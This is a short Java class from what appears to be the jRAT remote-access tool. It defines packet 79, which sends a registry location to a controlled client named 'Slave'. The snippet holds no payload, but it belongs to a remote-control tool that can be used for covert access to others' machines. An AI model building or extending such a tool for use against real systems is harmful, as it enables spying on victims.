package jrat.module.registry;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;


public class PacketQuery implements OutgoingPacket {

	private String location;

	public PacketQuery(String location) {
		this.location = location;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeLine(location);
	}

	@Override
	public short getPacketId() {
		return 79;
	}

}
